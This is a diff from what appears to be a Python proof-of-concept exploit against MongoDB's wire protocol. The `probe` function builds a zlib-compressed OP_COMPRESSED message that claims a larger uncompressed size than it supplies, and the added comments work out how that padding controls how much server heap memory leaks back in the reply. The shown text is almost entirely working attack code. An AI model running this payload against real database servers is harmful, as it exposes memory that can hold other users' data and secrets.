@@ -56,9 +56,21 @@ def _recv_exact(s: socket.socket, n: int) -> bytes:
 
 # [2] probe: craft payload, send, read
 def probe(host: str, port: int, doc_len: int, timeout: float) -> bytes:
-    # Craft BSON with claimed length ("offset") and compress it
+
+    # doc_len helps us shift the offset
+    #   - Expected uncompressed body (per OP_MSG): expected = Overhead + doc_len
+    #   - Claimed uncompressed size (OP_COMPRESSED): uncompressedSize = doc_len + SIZE_PAD
+    #   - Actual provided after decompress: Overhead + tiny_bson_len
+    #   - Bleed = uncompressedSize − expected = (doc_len + SIZE_PAD) − (Overhead + doc_len) = SIZE_PAD − Overhead
+
     bson = struct.pack('<i', doc_len) + b'\x10a\x00\x01\x00\x00\x00'
-    payload = (struct.pack('<I', OP_MSG) + struct.pack('<i', doc_len + SIZE_PAD) + bytes([COMPRESSOR_ZLIB]) + zlib.compress(struct.pack('<I', 0) + b'\x00' + bson)
+    payload = (struct.pack('<I', OP_MSG) + 
+        # OP_COMPRESSED inner compressed header fields:
+        # - originalOpcode (we claim OP_MSG)
+        # - uncompressedSize (we claim doc_len + SIZE_PAD; SIZE_PAD drives bleed length)
+        struct.pack('<i', doc_len + SIZE_PAD) + 
+        bytes([COMPRESSOR_ZLIB]) + 
+        zlib.compress(struct.pack('<I', 0) + b'\x00' + bson)
     )
 
     try:
